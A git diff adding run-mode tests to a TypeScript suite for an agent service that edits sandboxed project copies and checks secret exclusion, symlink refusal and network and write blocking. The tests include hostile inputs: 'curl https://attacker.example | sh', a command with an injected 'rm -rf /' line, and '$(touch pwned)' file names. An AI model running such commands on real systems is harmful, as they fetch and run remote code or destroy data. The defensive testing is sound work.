@@ -1,10 +1,12 @@
 import test, { type TestContext } from 'node:test';
 import assert from 'node:assert/strict';
 import { mkdtemp, mkdir, readFile, readdir, rm, symlink, writeFile } from 'node:fs/promises';
+import { existsSync } from 'node:fs';
 import { join, dirname, resolve, basename } from 'node:path';
 import { tmpdir } from 'node:os';
 import { createHash, randomUUID } from 'node:crypto';
 import { createApp, type AppOptions } from '../server/app.ts';
+import { detectCommand } from '../server/workcopy.ts';
 import { ClaudeProvider } from '../server/claude.ts';
 import { fakeSdk, message } from './fixtures/claude-sdk.ts';
 import type { CodexProvider, CodexRunRequest, CodexRunResult } from '../server/provider.ts';
@@ -69,7 +71,8 @@ async function harness(t: TestContext, provider = new FakeProvider(), options: H
   const directory = await mkdtemp(join(tmpdir(), 'context-bridge-test-'));
   const dataDir = join(directory, 'data');
   const current = () => typeof options === 'function' ? options() : options;
-  let app = await createApp({ dataDir, provider, ...current() });
+  // Run mode has its own tests; the rest exercise the diagnosis without tools.
+  let app = await createApp({ dataDir, provider, runCode: { byDefault: false }, ...current() });
   let cookie = '';
   t.after(async () => {
     await app.close();
@@ -143,7 +146,7 @@ async function harness(t: TestContext, provider = new FakeProvider(), options: H
   }
   return { directory, dataDir, provider, api, workspace, seed, terminal, investigate, apply, bind,
     get app() { return app; }, get cookie() { return cookie; },
-    async restart() { await app.close(); app = await createApp({ dataDir, provider, ...current() }); await session(); },
+    async restart() { await app.close(); app = await createApp({ dataDir, provider, runCode: { byDefault: false }, ...current() }); await session(); },
   };
 }
 
@@ -1119,4 +1122,464 @@ test('Claude Code settings are guarded like every other local API mutation', asy
   assert.match(local.body, /personal use only/);
   const codexOnly = await harness(t);
   assert.equal((await codexOnly.api('PUT', '/api/claude/api-key', { apiKey: CLAUDE_KEY })).statusCode, 400, 'A service without Claude Code rejects its settings');
+});
+
+/** Run mode: the agent edits its project copy instead of returning file text. */
+class RunProvider extends FakeProvider {
+  /** What the agent does in its working copy, per request. */
+  acts: ((request: CodexRunRequest) => Promise<void> | void)[] = [];
+  /** Whether a sandbox for the agent's commands is available here. */
+  tools = true;
+  async commandAccess() { return { available: this.tools, note: this.tools ? 'Fake sandbox.' : 'The fake sandbox is not set up.' }; }
+  knownAccess() { return { available: this.tools, note: this.tools ? 'Fake sandbox.' : 'The fake sandbox is not set up.' }; }
+  answer(fields: Partial<Record<'outcome' | 'title' | 'summary' | 'rationale' | 'risk', string>> & { questions?: string[] } = {}) {
+    this.replies.push(JSON.stringify({ outcome: 'proposal', title: 'Make the return gentler', summary: 'Increase the return duration.', rationale: 'Ran the check in the copy.', evidence: ['node check.js passed'], questions: [], risk: 'Test on the arm.', ...fields }));
+  }
+  override async run(request: CodexRunRequest): Promise<CodexRunResult> {
+    const act = this.acts.shift();
+    if (act) await act(request);
+    return super.run(request);
+  }
+}
+// A verification command that needs no tool besides Node: it fails when the duration is above 2 s.
+const CHECK_SCRIPT = "const t=require('fs').readFileSync('motion.py','utf8');const m=t.match(/return_duration = ([0-9.]+)/);if(!m){console.error('motion.py: return_duration is missing');process.exit(1)}if(Number(m[1])>2){console.error('return_duration '+m[1]+' exceeds the safe 2.0 s');process.exit(1)}console.log('ok '+m[1]);";
+async function runProject(h: Awaited<ReturnType<typeof harness>>) {
+  const root = join(h.directory, 'arm_project');
+  for (const [path, content] of [['motion.py', 'return_duration = 0.6\n'], ['check.js', CHECK_SCRIPT], ['.env', 'TOKEN=never-copy\n'], ['node_modules/dep/index.js', 'module.exports = 1;\n'], ['data/readme.txt', 'notes\n']]) {
+    await mkdir(dirname(join(root, path)), { recursive: true });
+    await writeFile(join(root, path), content);
+  }
+  const task = await h.seed([]);
+  const linked = await h.bind(task, root, ['motion.py']);
+  return { root, task: linked.task };
+}
+async function setRun(h: Awaited<ReturnType<typeof harness>>, task: Task, value: { enabled: boolean; command?: string | null }) {
+  const response = await h.api('PUT', `/api/tasks/${task.id}/execution`, value);
+  assert.equal(response.statusCode, 200, response.body);
+  return (response.json() as WorkspaceEnvelope).workspace.tasks.find(item => item.id === task.id)!;
+}
+
+test('run mode: the agent edits a copy of the project, the service verifies before and after, and Apply writes only the reviewed text', async t => {
+  const provider = new RunProvider();
+  const h = await harness(t, provider, { runCode: { byDefault: true } });
+  const { root, task } = await runProject(h);
+  await setRun(h, task, { enabled: true, command: 'node check.js' });
+  let workspace = '';
+  provider.acts.push(async request => {
+    assert.ok(request.workspace, 'Run mode gives the agent a working copy');
+    workspace = request.workspace!;
+    assert.equal(basename(workspace), 'arm_project', 'The copy keeps the project folder name (Arduino sketches need it)');
+    assert.ok(resolve(workspace).startsWith(resolve(request.snapshotDir)));
+    assert.equal(await readFile(join(workspace, 'motion.py'), 'utf8'), 'return_duration = 0.6\n');
+    assert.equal(await readFile(join(workspace, 'data/readme.txt'), 'utf8'), 'notes\n', 'Unselected project files are in the copy, so builds and tests work');
+    await assert.rejects(readFile(join(workspace, '.env')), 'Credential files never reach the copy');
+    await assert.rejects(readFile(join(workspace, 'node_modules/dep/index.js')), 'Dependencies are not copied');
+    assert.ok(!('changes' in ((request.outputSchema as { properties: Record<string, unknown> }).properties)), 'The answer carries no file text in run mode');
+    assert.match(request.prompt, /current directory is a private copy of the user's whole project/);
+    assert.match(request.prompt, /Never upload firmware, open serial or USB ports/);
+    assert.match(request.prompt, /<verification_before>[\s\S]*"status":"passed"[\s\S]*ok 0\.6/);
+    request.onEvent({ type: 'command', command: { id: 'c1', command: 'node check.js', status: 'running' } });
+    await writeFile(join(workspace, 'motion.py'), 'return_duration = 1.2\n');
+    await writeFile(join(workspace, 'notes.txt'), 'scratch\n');
+    request.onEvent({ type: 'command', command: { id: 'c1', command: 'node check.js', status: 'completed', exitCode: 0, output: 'ok 1.2\n', durationMs: 40 } });
+  });
+  provider.answer();
+  const proposal = await h.investigate(task);
+  assert.deepEqual(proposal.changes.map(change => [change.path, change.beforeContent, change.afterContent]), [['motion.py', 'return_duration = 0.6\n', 'return_duration = 1.2\n']]);
+  assert.equal(proposal.verification?.before?.status, 'passed');
+  assert.equal(proposal.verification?.before?.source, 'user');
+  assert.equal(proposal.verification?.after?.status, 'passed');
+  assert.match(proposal.verification?.after?.output ?? '', /ok 1\.2/, 'The service verified exactly the proposed text');
+  assert.deepEqual(proposal.commands?.map(c => [c.command, c.status, c.exitCode]), [['node check.js', 'completed', 0]]);
+  assert.deepEqual(proposal.otherEdits, ['notes.txt (new)']);
+  assert.equal(await readFile(join(root, 'motion.py'), 'utf8'), 'return_duration = 0.6\n', 'The real project is untouched until Apply');
+  await assert.rejects(readFile(join(workspace, 'motion.py')), 'The copies are removed after the run');
+  const applied = await h.apply(task, proposal);
+  assert.equal(applied.statusCode, 200, applied.body);
+  assert.equal(await readFile(join(root, 'motion.py'), 'utf8'), 'return_duration = 1.2\n');
+  await assert.rejects(readFile(join(root, 'notes.txt')), 'Edits outside the selection are never applied');
+});
+
+test('run mode: a change that breaks the verification command goes back once and is fixed in the same copy', async t => {
+  const provider = new RunProvider();
+  const h = await harness(t, provider, { runCode: { byDefault: true } });
+  const { task } = await runProject(h);
+  await setRun(h, task, { enabled: true, command: 'node check.js' });
+  const dirs: string[] = [];
+  provider.acts.push(async request => { dirs.push(request.workspace!); await writeFile(join(request.workspace!, 'motion.py'), 'return_duration = 3.0\n'); });
+  provider.answer({ title: 'Much slower return' });
+  provider.acts.push(async request => {
+    dirs.push(request.workspace!);
+    assert.equal(await readFile(join(request.workspace!, 'motion.py'), 'utf8'), 'return_duration = 3.0\n', 'The first edits are still in the copy');
+    assert.match(request.prompt, /<automatic_check_failures>[\s\S]*Verification command[\s\S]*exceeds the safe 2\.0 s/);
+    assert.match(request.prompt, /your edits are still in your working copy/);
+    await writeFile(join(request.workspace!, 'motion.py'), 'return_duration = 1.5\n');
+  });
+  provider.answer({ title: 'Slower return within the safe range' });
+  const proposal = await h.investigate(task);
+  assert.equal(provider.requests.length, 2);
+  assert.equal(dirs[0], dirs[1]);
+  assert.equal(proposal.title, 'Slower return within the safe range');
+  assert.equal(proposal.changes[0].afterContent, 'return_duration = 1.5\n');
+  assert.equal(proposal.verification?.after?.status, 'passed');
+});
+
+test('run mode: a missing build tool is reported, not blamed on the code, and without a command the agent still works in the copy', async t => {
+  const provider = new RunProvider();
+  const h = await harness(t, provider, { runCode: { byDefault: true } });
+  const { task } = await runProject(h);
+  await setRun(h, task, { enabled: true, command: 'context-bridge-no-such-tool --build' });
+  provider.acts.push(async request => { await writeFile(join(request.workspace!, 'motion.py'), 'return_duration = 1.2\n'); });
+  provider.answer();
+  const proposal = await h.investigate(task);
+  assert.equal(provider.requests.length, 1, 'A missing program is not a reason to change the code');
+  assert.equal(proposal.verification?.before?.status, 'unavailable');
+  assert.match(proposal.verification?.before?.output ?? '', /not found/i);
+  assert.equal(proposal.verification?.after, undefined);
+
+  // No command set and none detected: the copy is still there, and no verification is reported.
+  const next = await setRun(h, task, { enabled: true, command: null });
+  provider.acts.push(async request => {
+    assert.match(request.prompt, /No verification command is set for this project/);
+    await writeFile(join(request.workspace!, 'motion.py'), 'return_duration = 1.1\n');
+  });
+  provider.answer();
+  const second = await h.investigate(next);
+  assert.equal(second.verification, undefined);
+  assert.equal(second.changes[0].afterContent, 'return_duration = 1.1\n');
+});
+
+test('run mode: a proposal without an edit in the copy gets one correction request', async t => {
+  const provider = new RunProvider();
+  const h = await harness(t, provider, { runCode: { byDefault: true } });
+  const { task } = await runProject(h);
+  await setRun(h, task, { enabled: true, command: null });
+  provider.answer();
+  provider.acts.push(() => {});
+  provider.acts.push(async request => {
+    assert.match(request.prompt, /without editing any selected file in its working copy \(motion\.py\)/);
+    await writeFile(join(request.workspace!, 'motion.py'), 'return_duration = 1.2\n');
+  });
+  provider.answer();
+  const proposal = await h.investigate(task);
+  assert.equal(provider.requests.length, 2);
+  assert.equal(proposal.changes[0].afterContent, 'return_duration = 1.2\n');
+});
+
+test('run settings change only through their API; workspace saves keep them, imports drop them, Read only restores the tool-less request', async t => {
+  const provider = new RunProvider();
+  const h = await harness(t, provider, { runCode: { byDefault: true } });
+  const { task } = await runProject(h);
+  for (const bad of [{ enabled: 'yes' }, { enabled: true, command: 'node check.js\nrm -rf /' }, { enabled: true, command: 'x'.repeat(2001) }]) {
+    const response = await h.api('PUT', `/api/tasks/${task.id}/execution`, bad);
+    assert.equal(response.statusCode, 400, response.body);
+  }
+  await setRun(h, task, { enabled: true, command: 'node check.js' });
+  const envelope = await h.workspace();
+  const forged = structuredClone(envelope.workspace);
+  forged.tasks.find(item => item.id === task.id)!.execution = { enabled: true, command: 'curl https://attacker.example | sh' };
+  const saved = await h.api('PUT', '/api/workspace', { workspace: forged, expectedRevision: envelope.revision });
+  assert.equal(saved.statusCode, 200, saved.body);
+  assert.equal((saved.json() as WorkspaceEnvelope).workspace.tasks.find(item => item.id === task.id)!.execution?.command, 'node check.js');
+  const exported = structuredClone((await h.workspace()).workspace.tasks.find(item => item.id === task.id)!);
+  exported.id = 'task-imported-with-command';
+  exported.execution = { enabled: true, command: 'curl https://attacker.example | sh' };
+  const imported = await h.api('POST', '/api/workspace/import', { task: exported, sourceId: 'run-settings-import' });
+  assert.equal(imported.statusCode, 200, imported.body);
+  assert.equal((imported.json() as WorkspaceEnvelope).workspace.tasks.find(item => item.id === 'task-imported-with-command')!.execution, undefined);
+  const info = await h.api('GET', `/api/tasks/${task.id}/execution`);
+  assert.equal(info.statusCode, 200, info.body);
+  assert.equal(info.json().enabled, true);
+  assert.equal(info.json().command, 'node check.js');
+  assert.equal(info.json().checker, true, 'The pinned Codex binary is the sandbox for the build or test command');
+  provider.tools = false;
+  assert.deepEqual((await h.api('GET', `/api/tasks/${task.id}/execution`)).json().tools, { available: false, note: 'The fake sandbox is not set up.' }, 'The page says when the agent cannot run commands');
+  provider.tools = true;
+  const readOnly = await setRun(h, task, { enabled: false, command: 'node check.js' });
+  provider.proposal([{ path: 'motion.py', afterContent: 'return_duration = 1.2\n' }]);
+  const proposal = await h.investigate(readOnly);
+  assert.equal(provider.requests.at(-1)!.workspace, undefined, 'Read only gives the agent no working copy');
+  assert.ok('changes' in ((provider.requests.at(-1)!.outputSchema as { properties: Record<string, unknown> }).properties));
+  assert.equal(proposal.verification, undefined);
+});
+
+test('the run settings detect an Arduino sketch build for a known board, an npm test script and pytest', async t => {
+  const h = await harness(t, new RunProvider(), { runCode: { byDefault: true } });
+  const root = join(h.directory, 'robot');
+  for (const [path, content] of [['Arduino_Uno_Arm_Test/Arduino_Uno_Arm_Test.ino', 'void setup(){}\nvoid loop(){}\n'], ['host/motion.py', 'return_duration = 0.6\n']]) {
+    await mkdir(dirname(join(root, path)), { recursive: true });
+    await writeFile(join(root, path), content);
+  }
+  const seeded = await h.seed([]);
+  const { task } = await h.bind(seeded, root, ['Arduino_Uno_Arm_Test/Arduino_Uno_Arm_Test.ino']);
+  const detected = async () => (await h.api('GET', `/api/tasks/${task.id}/execution`)).json().detected as string | undefined;
+  const envelope = await h.workspace();
+  const state = structuredClone(envelope.workspace);
+  state.tasks.find(item => item.id === task.id)!.hardware.controller = 'Arduino Uno';
+  assert.equal((await h.api('PUT', '/api/workspace', { workspace: state, expectedRevision: envelope.revision })).statusCode, 200);
+  assert.equal(await detected(), 'arduino-cli compile --fqbn arduino:avr:uno Arduino_Uno_Arm_Test');
+  // A board without a known board ID gets no guessed compile command.
+  const latest = await h.workspace();
+  const other = structuredClone(latest.workspace);
+  other.tasks.find(item => item.id === task.id)!.hardware.controller = 'Other';
+  assert.equal((await h.api('PUT', '/api/workspace', { workspace: other, expectedRevision: latest.revision })).statusCode, 200);
+  assert.equal(await detected(), undefined);
+  await writeFile(join(root, 'package.json'), JSON.stringify({ scripts: { test: 'node --test' } }));
+  assert.equal(await detected(), 'npm test');
+  await writeFile(join(root, 'package.json'), JSON.stringify({ scripts: { test: 'echo "Error: no test specified" && exit 1' } }));
+  assert.equal(await detected(), undefined);
+  await writeFile(join(root, 'host/test_motion.py'), 'def test_duration():\n    assert True\n');
+  assert.equal(await detected(), undefined, 'A test_*.py file alone may be a hardware script, so pytest is not guessed');
+  await writeFile(join(root, 'host/test_motion.py'), 'import pytest\n\ndef test_duration():\n    assert True\n');
+  assert.match(await detected() ?? '', /-m pytest -q$/);
+  await writeFile(join(root, 'platformio.ini'), '[env:uno]\nplatform = atmelavr\ntargets = upload\n');
+  assert.equal(await detected(), 'pio run -t checkprogsize', 'PlatformIO builds an explicit target, so a default `targets = upload` never flashes the board');
+  // A detected command is only a suggestion: nothing runs it until the user saves it.
+  const info = (await h.api('GET', `/api/tasks/${task.id}/execution`)).json();
+  assert.equal(info.command ?? null, null);
+});
+
+test('run mode with no sandbox for the build or test command: the command does not run, the agent still works in the copy', async t => {
+  const provider = new RunProvider();
+  const h = await harness(t, provider, { runCode: { byDefault: true, sandbox: async () => undefined } });
+  const { root, task } = await runProject(h);
+  await writeFile(join(root, 'check.js'), `require('fs').writeFileSync(${JSON.stringify(join(h.directory, 'ran.txt'))}, 'x');`);
+  await setRun(h, task, { enabled: true, command: 'node check.js' });
+  provider.acts.push(async request => {
+    assert.ok(request.workspace);
+    assert.doesNotMatch(request.prompt, /<verification_before>/);
+    await writeFile(join(request.workspace!, 'motion.py'), 'return_duration = 1.2\n');
+  });
+  provider.answer();
+  const response = await h.api('POST', '/api/agent/investigate', { taskId: task.id, roundId: task.activeRoundId });
+  const job = await h.terminal((response.json() as JobView).id);
+  assert.equal(job.status, 'completed', JSON.stringify(job));
+  const proposal = job.result as Proposal;
+  assert.equal(proposal.verification, undefined);
+  assert.ok(job.activity?.some(entry => /No sandbox is available on this computer for the build or test command/.test(entry.text)));
+  assert.equal(existsSync(join(h.directory, 'ran.txt')), false, 'Unreviewed code never runs outside a sandbox');
+  assert.equal(proposal.changes[0].afterContent, 'return_duration = 1.2\n');
+});
+
+test('run mode: secret files stay out of the copy, Arduino secrets keep only their names, and nothing is left behind', async t => {
+  const provider = new RunProvider();
+  const h = await harness(t, provider, { runCode: { byDefault: true } });
+  const { root, task } = await runProject(h);
+  for (const [path, content] of [['.npmrc', '//registry.npmjs.org/:_authToken=npm_secret\n'], ['keys/device.pem', 'PRIVATE\n'], ['service-account.json', '{"private_key":"x"}\n'], ['sketch/arduino_secrets.h', '#include "config.h"\n#define SECRET_SSID "home-wifi"\n#define SECRET_PASS "hunter2"\n']]) {
+    await mkdir(dirname(join(root, path)), { recursive: true });
+    await writeFile(join(root, path), content);
+  }
+  await setRun(h, task, { enabled: true, command: null });
+  let workspace = '';
+  provider.acts.push(async request => {
+    workspace = request.workspace!;
+    for (const path of ['.npmrc', 'keys/device.pem', 'service-account.json']) await assert.rejects(readFile(join(workspace, path)), path);
+    const secrets = await readFile(join(workspace, 'sketch/arduino_secrets.h'), 'utf8');
+    assert.match(secrets, /#include "config.h"/, 'Includes stay, so the sketch still compiles');
+    assert.match(secrets, /#define SECRET_SSID ""/);
+    assert.ok(!secrets.includes('hunter2') && !secrets.includes('home-wifi'));
+    await writeFile(join(workspace, 'motion.py'), 'return_duration = 1.2\n');
+  });
+  provider.answer();
+  await h.investigate(task);
+  const runs = join(h.dataDir, 'runs');
+  const left = existsSync(runs) ? await readdir(runs, { recursive: true }) : [];
+  assert.deepEqual(left.filter(name => /(^|[\\/])(work|check|check-tmp|tmp)$/.test(String(name))), [], 'The project copies are removed after the run');
+});
+
+test('run mode: a command still running when the agent answers is shown as stopped, and the total count is kept', async t => {
+  const provider = new RunProvider();
+  const h = await harness(t, provider, { runCode: { byDefault: true } });
+  const { task } = await runProject(h);
+  await setRun(h, task, { enabled: true, command: null });
+  provider.acts.push(async request => {
+    for (let i = 0; i < 25; i++) {
+      request.onEvent({ type: 'command', command: { id: `c${i}`, command: `echo ${i}`, status: 'running' } });
+      request.onEvent({ type: 'command', command: { id: `c${i}`, command: `echo ${i}`, status: 'completed', exitCode: 0, output: `${i}\n` } });
+    }
+    request.onEvent({ type: 'command', command: { id: 'bg', command: 'node watch.js', status: 'running' } });
+    await writeFile(join(request.workspace!, 'motion.py'), 'return_duration = 1.2\n');
+  });
+  provider.answer();
+  const proposal = await h.investigate(task);
+  assert.equal(proposal.commandCount, 26);
+  assert.deepEqual(proposal.commands?.at(-1), { id: 'bg', command: 'node watch.js', status: 'failed', exitCode: null, output: 'Still running when Codex finished, so it was stopped.' });
+});
+
+test('run mode: a selected file replaced by a link in the copy is refused, never followed', { skip: process.platform === 'win32' ? 'symlinks need extra rights on Windows' : false }, async t => {
+  const provider = new RunProvider();
+  const h = await harness(t, provider, { runCode: { byDefault: true } });
+  const { task } = await runProject(h);
+  await writeFile(join(h.directory, 'private.txt'), 'outside the project\n');
+  await setRun(h, task, { enabled: true, command: null });
+  provider.acts.push(async request => {
+    await rm(join(request.workspace!, 'motion.py'));
+    await symlink(join(h.directory, 'private.txt'), join(request.workspace!, 'motion.py'));
+  });
+  provider.answer();
+  const response = await h.api('POST', '/api/agent/investigate', { taskId: task.id, roundId: task.activeRoundId });
+  const job = await h.terminal((response.json() as JobView).id);
+  assert.equal(job.status, 'failed');
+  assert.match(job.error ?? '', /motion\.py in the working copy is no longer a regular text file/);
+  assert.ok(!JSON.stringify(job).includes('outside the project'), 'The linked file is never read into the result');
+});
+
+test('command detection: library examples and sketch names a shell could misread are never used', () => {
+  const task = (controller: string, files: string[]) => ({ rootPath: '/p/arm', hardware: { controller }, files: files.map(path => ({ name: basename(path), relativePath: path, includeInContext: true })) }) as unknown as Task;
+  const none = () => undefined;
+  const paths = ['Arm/Arm.ino', 'Grip/Grip.ino', 'libraries/Servo/examples/Sweep/Sweep.ino', 'x$(touch pwned)/x$(touch pwned).ino'];
+  assert.equal(detectCommand(task('Arduino Uno', ['Grip/Grip.ino']), paths, none), 'arduino-cli compile --fqbn arduino:avr:uno Grip', 'The sketch that holds the selected file is built');
+  assert.equal(detectCommand(task('Arduino Uno', ['x$(touch pwned)/x$(touch pwned).ino']), paths, none), undefined, 'A selected file outside any usable sketch gets no guessed build');
+  assert.equal(detectCommand(task('Arduino Uno', ['notes.md']), ['Arm/Arm.ino', 'libraries/Servo/examples/Sweep/Sweep.ino', 'x$(touch pwned)/x$(touch pwned).ino'], none), 'arduino-cli compile --fqbn arduino:avr:uno Arm', 'Library examples and unsafe names do not count as sketches');
+  assert.equal(detectCommand(task('Arduino Uno', ['notes.md']), paths, none), undefined, 'With two candidate sketches and none selected, nothing is guessed');
+  assert.equal(detectCommand(task('Arduino Uno', ['My Arm/My Arm.ino']), ['My Arm/My Arm.ino'], none), 'arduino-cli compile --fqbn arduino:avr:uno "My Arm"');
+  assert.equal(detectCommand(task('Other', ['Arm/Arm.ino']), paths, none), undefined);
+});
+
+test('run mode without a sandbox for the agent: no tools, but the build or test command still runs around the proposal', async t => {
+  const provider = new RunProvider();
+  provider.tools = false;
+  const h = await harness(t, provider, { runCode: { byDefault: true } });
+  const { task } = await runProject(h);
+  await setRun(h, task, { enabled: true, command: 'node check.js' });
+  provider.acts.push(request => {
+    assert.equal(request.workspace, undefined, 'No working copy without a sandbox');
+    assert.ok('changes' in ((request.outputSchema as { properties: Record<string, unknown> }).properties));
+    assert.match(request.prompt, /You have no tools and need none/);
+    assert.match(request.prompt, /Build or test command: "node check\.js"[\s\S]*<verification_before>/);
+  });
+  provider.proposal([{ path: 'motion.py', afterContent: 'return_duration = 3.0\n' }]);
+  provider.acts.push(request => {
+    assert.match(request.prompt, /exceeds the safe 2\.0 s/);
+    assert.match(request.prompt, /give the full replacement text of each changed file again/);
+  });
+  provider.proposal([{ path: 'motion.py', afterContent: 'return_duration = 1.4\n' }]);
+  const proposal = await h.investigate(task);
+  assert.equal(provider.requests.length, 2);
+  assert.equal(proposal.changes[0].afterContent, 'return_duration = 1.4\n');
+  assert.equal(proposal.verification?.before?.status, 'passed');
+  assert.equal(proposal.verification?.after?.status, 'passed');
+  assert.equal(proposal.commands?.length, 0);
+});
+
+// The real Codex binary in run mode, driven by a scripted local model: no account and no network.
+// It proves the commands really run in a sandboxed copy, edits come back as the proposal, writes to
+// the real project and network access are blocked, and the service verifies before and after.
+const codexBinary = (() => {
+  try {
+    const platform = `${process.platform}-${process.arch}`;
+    const target = ({ 'linux-x64': 'x86_64-unknown-linux-musl', 'linux-arm64': 'aarch64-unknown-linux-musl', 'darwin-x64': 'x86_64-apple-darwin', 'darwin-arm64': 'aarch64-apple-darwin' } as Record<string, string>)[platform];
+    if (!target) return undefined;
+    const path = join(resolve('node_modules'), '@openai', `codex-${platform}`, 'vendor', target, 'bin', 'codex');
+    return existsSync(path) ? path : undefined;
+  } catch { return undefined; }
+})();
+test('run mode with the real Codex binary: commands run in a sandboxed copy, edits become the proposal, and the real project and network are out of reach', { skip: codexBinary ? false : 'The Codex binary for this platform is not installed (Windows is not covered here)', timeout: 180_000 }, async t => {
+  const { startResponsesMock, toolOutputs } = await import('./fixtures/responses-mock.ts');
+  const { LocalCodexProvider } = await import('../server/codex.ts');
+  const final = JSON.stringify({ outcome: 'proposal', title: 'Make the return gentler', summary: 'Return duration 0.6 s to 1.2 s.', rationale: 'node check.js passed before and after the edit in the copy.', evidence: ['ok 0.6', 'ok 1.2'], questions: [], risk: 'Test on the arm.' });
+  let root = '';
+  const steps: import('./fixtures/responses-mock.ts').Step[] = [];
+  const mock = await startResponsesMock(steps);
+  t.after(() => mock.close());
+  const directory = await mkdtemp(join(tmpdir(), 'context-bridge-codex-'));
+  t.after(() => rm(directory, { recursive: true, force: true }));
+  const home = join(directory, 'home');
+  let provider: InstanceType<typeof LocalCodexProvider> | undefined;
+  const h = await harness(t, undefined, () => ({ ...(provider ? { provider } : {}), runCode: { byDefault: true, timeoutMs: 120_000 } }));
+  await mkdir(join(h.dataDir, 'codex'), { recursive: true });
+  await mkdir(home, { recursive: true });
+  await writeFile(join(h.dataDir, 'codex', 'auth.json'), JSON.stringify({ auth_mode: 'apikey', OPENAI_API_KEY: 'dummy-not-a-key' }));
+  provider = new LocalCodexProvider({
+    dataDir: h.dataDir,
+    testLaunch: {
+      config: {
+        model: 'gpt-5.5', model_provider: 'mock', check_for_update_on_startup: false, 'analytics.enabled': false,
+        'model_providers.mock.name': 'Local mock', 'model_providers.mock.base_url': `http://127.0.0.1:${mock.port}/v1`,
+        'model_providers.mock.wire_api': 'responses', 'model_providers.mock.requires_openai_auth': true,
+        'model_providers.mock.request_max_retries': 0, 'model_providers.mock.stream_max_retries': 0,
+      },
+      // Anything other than the mock goes to a closed port.
+      env: { PATH: process.env.PATH, LANG: 'C.UTF-8', HOME: home, HTTPS_PROXY: 'http://127.0.0.1:9', HTTP_PROXY: 'http://127.0.0.1:9', ALL_PROXY: 'http://127.0.0.1:9', NO_PROXY: '127.0.0.1,localhost' },
+    },
+  });
+  t.after(() => provider?.close?.());
+  await h.restart();
+  const project = await runProject(h);
+  root = project.root;
+  const task = project.task;
+  await setRun(h, task, { enabled: true, command: 'node check.js' });
+  const outside = join(root, 'escaped.txt');
+  steps.push(
+    { shell: 'node check.js && cat motion.py' },
+    { patch: '*** Begin Patch\n*** Update File: motion.py\n@@\n-return_duration = 0.6\n+return_duration = 1.2\n*** End Patch' },
+    { shell: `node check.js; (echo escaped > ${JSON.stringify(outside)}) 2>/dev/null && echo WRITE_OPEN || echo WRITE_BLOCKED; node -e "require('http').get('http://127.0.0.1:${mock.port}/ping',r=>console.log('NET_OPEN',r.statusCode)).on('error',e=>console.log('NET_BLOCKED',e.code))"` },
+    { message: final },
+  );
+  const started = await h.api('POST', '/api/agent/investigate', { taskId: task.id, roundId: task.activeRoundId });
+  assert.equal(started.statusCode, 202, started.body);
+  let job = started.json() as JobView;
+  for (let i = 0; i < 1200 && job.status === 'running'; i++) {
+    await new Promise(r => setTimeout(r, 100));
+    job = (await h.api('GET', `/api/jobs/${job.id}`)).json() as JobView;
+  }
+  assert.equal(job.status, 'completed', JSON.stringify(job));
+  const proposal = job.result as Proposal;
+  const outputs = toolOutputs(mock.requests);
+  assert.match(outputs[0] ?? '', /ok 0\.6[\s\S]*return_duration = 0\.6/, 'The first command really ran in the copy, and its output reached the model');
+  assert.match(outputs[1] ?? '', /Success|motion\.py/, 'apply_patch edited the copy');
+  assert.match(outputs[2] ?? '', /ok 1\.2/, 'The second check ran on the edited copy');
+  assert.match(outputs[2] ?? '', /WRITE_BLOCKED/, 'Writing to the real project is blocked by the sandbox');
+  assert.match(outputs[2] ?? '', /NET_BLOCKED/, 'The network is blocked by the sandbox');
+  assert.equal(mock.requests.filter(request => request.url.startsWith('/ping')).length, 0);
+  await assert.rejects(readFile(outside));
+  assert.deepEqual(proposal.changes.map(change => [change.path, change.beforeContent, change.afterContent]), [['motion.py', 'return_duration = 0.6\n', 'return_duration = 1.2\n']]);
+  assert.equal(proposal.verification?.before?.status, 'passed');
+  assert.equal(proposal.verification?.after?.status, 'passed');
+  assert.match(proposal.verification?.after?.output ?? '', /ok 1\.2/);
+  assert.deepEqual(proposal.commands?.map(command => [command.command.split(';')[0], command.status]), [['node check.js && cat motion.py', 'completed'], ['node check.js', 'completed']]);
+  assert.equal(await readFile(join(root, 'motion.py'), 'utf8'), 'return_duration = 0.6\n', 'The real project is untouched until Apply');
+  const applied = await h.apply(task, proposal);
+  assert.equal(applied.statusCode, 200, applied.body);
+  assert.equal(await readFile(join(root, 'motion.py'), 'utf8'), 'return_duration = 1.2\n');
+});
+
+test('the real Codex binary: a command left running in the background stops before the copy is read, and the page shows the whole command', { skip: codexBinary ? false : 'The Codex binary for this platform is not installed', timeout: 120_000 }, async t => {
+  const { startResponsesMock } = await import('./fixtures/responses-mock.ts');
+  const { LocalCodexProvider } = await import('../server/codex.ts');
+  const { runOutputSchema } = await import('../server/validation.ts');
+  const final = JSON.stringify({ outcome: 'proposal', title: 'T', summary: 'S', rationale: 'R', evidence: [], questions: [], risk: 'K' });
+  const mock = await startResponsesMock([
+    { shell: 'while true; do echo tick >> ticks.txt; sleep 0.1; done', yieldMs: 300 },
+    { shell: 'cd . && ls' },
+    { message: final },
+  ]);
+  t.after(() => mock.close());
+  const directory = await mkdtemp(join(tmpdir(), 'context-bridge-codex-'));
+  t.after(() => rm(directory, { recursive: true, force: true }));
+  const data = join(directory, 'data'), home = join(directory, 'home'), snapshot = join(data, 'runs', 'job'), workspace = join(snapshot, 'work', 'arm_project');
+  for (const dir of [join(data, 'codex'), home, workspace]) await mkdir(dir, { recursive: true });
+  await writeFile(join(data, 'codex', 'auth.json'), JSON.stringify({ auth_mode: 'apikey', OPENAI_API_KEY: 'dummy-not-a-key' }));
+  await writeFile(join(workspace, 'motion.py'), 'return_duration = 0.6\n');
+  const provider = new LocalCodexProvider({
+    dataDir: data,
+    testLaunch: {
+      config: {
+        model: 'gpt-5.5', model_provider: 'mock', check_for_update_on_startup: false, 'analytics.enabled': false,
+        'model_providers.mock.name': 'Local mock', 'model_providers.mock.base_url': `http://127.0.0.1:${mock.port}/v1`,
+        'model_providers.mock.wire_api': 'responses', 'model_providers.mock.requires_openai_auth': true,
+        'model_providers.mock.request_max_retries': 0, 'model_providers.mock.stream_max_retries': 0,
+      },
+      env: { PATH: process.env.PATH, LANG: 'C.UTF-8', HOME: home, HTTPS_PROXY: 'http://127.0.0.1:9', HTTP_PROXY: 'http://127.0.0.1:9', ALL_PROXY: 'http://127.0.0.1:9', NO_PROXY: '127.0.0.1,localhost' },
+    },
+  });
+  t.after(() => provider.close());
+  const commands: string[] = [];
+  await provider.run({ prompt: 'Diagnose.', snapshotDir: snapshot, workspace, outputSchema: runOutputSchema, signal: new AbortController().signal, onEvent: event => { if (event.type === 'command') commands.push(event.command.command); } });
+  assert.ok(commands.includes('cd . && ls'), `The page shows the command that ran, not Codex's summary of it: ${JSON.stringify(commands)}`);
